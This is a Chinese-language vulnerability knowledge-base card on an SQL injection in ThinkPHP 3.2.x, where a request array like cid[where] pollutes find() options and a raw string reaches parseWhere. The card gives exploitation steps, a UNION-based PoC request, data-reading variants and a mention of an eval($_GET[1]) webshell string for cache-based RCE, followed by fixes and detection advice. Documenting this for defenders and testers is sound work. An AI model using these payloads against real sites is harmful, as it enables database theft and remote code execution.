---
id: web-generic-sqli-thinkphp32-find-options-where-string-injection
title: ThinkPHP 3.2.x find($options) 数组参数污染：cid[where] 字符串被 parseWhere 原样拼接形成 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: thinkphp32-find-options-where-string-injection
tags:
- php
- thinkphp
- sqli
- array-parameter
- options-pollution
- parsewhere
- nday
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: 3.2.x（原文分析范围；原文未给出更细修复版本）
verification:
  verified_by: verifier-V381
  verified_at: '2026-11-09T08:22:53+08:00'
  notes: 已对照原文与3张图核对：cid[where]=2 时 debug 显示 where 字符串进入 find options，_parseOptions 仅对数组 where 做字段校验，parseWhere 对字符串原样拼接，union select 使 find 返回可控内容；与既有 TP3 ['exp',...] 数组表达式注入卡机制不同，非重复。原文标题/正文明确 ThinkPHP 3.2.x，affected_versions 保留。另已修正卡片误加的 mybatis 标签（PHP 卡不适用），KB 与 staging 同步移除。PoC 未复跑
url: /docs/web/generic/sqli/web-generic-sqli-thinkphp32-find-options-where-string-injection/
draft: false
kb_aliases:
- ThinkPHP find 数组注入
- cid[where] 注入
- find options 污染
- parseWhere 字符串直拼
- ThinkPHP 3.2 where 注入
- M()->find() 注入
---

## 一句话结论

ThinkPHP 3.2.x 的 `Model::find($options)` 允许直接传入数组作为查询选项；当控制器把用户可控的 `cid`（实际是 `cid[where]=...` 这样的数组）原样交给 `find()` 时，攻击者可以控制整个 `options` 数组，其中 `where` 若是**字符串**就会在 `parseWhere` 里被当作原始 SQL 片段直接拼进语句（不再做数组条件的字段校验/类型转换），形成任意 SQL 注入；`cid[where]=2=0 union select '...'` 即可让查询返回攻击者构造的行。

## 原理

- **入口参数可以是数组**：PHP 会把 `cid[where]=xxx` 解析成数组 `['where' => 'xxx']`；ThinkPHP 3.2 的 action 参数绑定/请求变量会把该数组原样传给 `page($cid)`，而 `find($cid)` 的第一个参数正是 `$options`，于是用户直接控制了查询选项数组。
- **find 对数组分支的处理**：`find($options)` 中 `is_numeric($options) || is_string($options)` 为假（$options 是数组），跳过「按主键查询」分支；随后设置 `$options['limit']=1`，调用 `_parseOptions($options)`。
- **where 为字符串时校验被跳过**：`_parseOptions` 只有在 `isset($options['where']) && is_array($options['where'])` 时才进入字段类型检查（`_parseType`、字段名白名单等）。若 `where` 是字符串，这个安全分支完全不执行；随后 `parseSql` 调用 `parseWhere($options['where'])`。
- **parseWhere 的原始 SQL 分支**：MySQL 驱动的 `parseWhere` 开头通常是 `if (is_string($where)) { $whereStr = $where; }`——字符串条件被原样使用，不再转义或参数化。最终 SQL 形如 `SELECT content FROM articles WHERE <攻击者字符串> LIMIT 1`。
- **为什么能任意读**：攻击者用 `2=0 union select '<任意值>'` 让原查询返回空集后接上自己的 select，结果行完全可控；也可用报错/时间盲注。原文用它把任意字符串（后续配合缓存写 RCE）作为查询结果返回。
- **与 exp 数组注入的区别**：`['exp', ...]` 是 ThinkPHP 的原始表达式机制；本卡是 `find($options)` 的 **options 数组污染**——`where` 直接以字符串形式进入 `parseWhere`，不经过 `exp` 分支，绕过的是「只校验数组条件」的假设。
- **前提**：应用把用户数组直接传给 `find()`/`where()`（常见于 `find($cid)` 这类把 action 参数直接当查询条件的写法），且请求参数解析允许数组形式（默认允许）。

## 触发条件

- 目标为 ThinkPHP 3.2.x，控制器存在 `find($userControlled)` 或 `where($userControlled)` 且参数可由请求数组控制。
- 请求参数未经过 `is_numeric`/`intval`/类型白名单强制转换（或在进入 `find` 前被转换掉）。
- 数据库驱动为 MySQL（`parseWhere` 的字符串分支行为），且应用未在全局对所有请求数组做递归过滤/拒绝。
- 目标表/字段可被注入语句访问，或至少能通过 UNION/报错获得回显。

## 利用步骤

1. 找到把请求参数直接传入模型查询的 action（如 `page($cid)` → `M('Articles')->find($cid)`）。
2. 确认参数可传数组：请求 `?cid[where]=2`，若页面按 id=2 返回内容，说明数组进入了 `find` 的 options。
3. 构造注入：`?cid[where]=2=0 union select '<任意内容>'`，观察返回内容变为 `<任意内容>`。
4. 需要读数据时改成 `2=0 union select (select group_concat(...) from ...)`，或用报错/时间盲注适配无回显场景。
5. 结合后续利用（如本卡的缓存写 RCE）时，让 union select 返回恶意字符串即可。

## PoC

```http
GET /index.php?s=home/index/page&cid[where]=2=0%20union%20select%20%27Hello%27 HTTP/1.1
Host: target
```

SQL 变为：

```sql
SELECT `content` FROM `articles` WHERE 2=0 union select 'Hello' LIMIT 1
```

页面返回 `Hello`（原文用该形式把 `eval($_GET[1]);//` 写入查询结果）。本卡未复现。

## 变体与关联

- **options 其它键**：`find` 接收的整个数组都会与模型 options 合并，`cache`、`field`、`limit` 等键同样可被污染；其中 `cache` 可进一步利用为文件写（见关联卡）。
- **exp 数组注入**：`name[0]=exp&name[1]=...` 走 ThinkPHP 原始表达式分支，是另一条注入路径（已有 TP3 array exp 卡）。
- **where 数组注入**：`cid[where][id]=...` 走数组条件解析，受字段校验限制，通常需要 `exp` 或特殊运算符配合。
- **修复**：action 内对 id 类参数做 `intval`/`is_numeric` 强校验，禁止把请求数组直接传给模型查询；升级到修复版本或框架层禁止 options 中的字符串 where。

## 检测与防御

- **输入校验**：所有传给模型查询的参数先做类型强制（int/string 白名单），绝不把 `$_GET`/`$_POST` 数组直接交给 `find()`/`where()`。
- **框架加固**：在 `_parseOptions`/`parseWhere` 中拒绝字符串形式的 `where`（或对其做参数化），仅允许结构化数组条件；限制 `find` 可接受的 options 键白名单。
- **WAF/日志**：检测 `cid[where]`、`[where]=` 形式的参数与 SQL 关键字/UNION；应用层记录异常查询字符串。
- **数据面**：数据库账号最小权限，关闭详细报错，避免注入回显与文件读写。
